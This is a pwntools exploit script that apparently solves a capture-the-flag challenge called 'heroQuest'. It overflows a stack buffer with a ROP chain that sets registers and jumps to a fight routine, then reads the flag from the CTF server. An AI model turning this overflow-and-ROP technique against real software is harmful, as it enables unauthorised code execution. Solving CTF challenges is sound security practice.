from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./heroQuest"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("tjc.tf", 31365)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


saveName = 0x04040A0
"""
0x00000000004017ab : pop rdi ; ret
0x00000000004017a9 : pop rsi ; pop r15 ; ret
"""
io.sendlineafter("save file! ", "finalBoss\0")
io.sendlineafter("(s)outh, or (w)est. ", 'w')
ddebug("b *0x401419\ncontinue")
io.sendlineafter("(r)est at the inn to save, or (g)o back ", 'r')

pop_rdi = 0x00000000004017ab
pop_rsi = 0x00000000004017a9

fight_addr = 0x4014DB
payload = b"tinyfata" * 4
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(saveName)
payload += p64(fight_addr)
payload += p64(pop_rsi)
payload += p64(0)*2

io.sendlineafter("save file: ", payload)


io.recvuntil("flag as proof of your victory!\n")
flag = io.recvline().strip()

io.interactive()
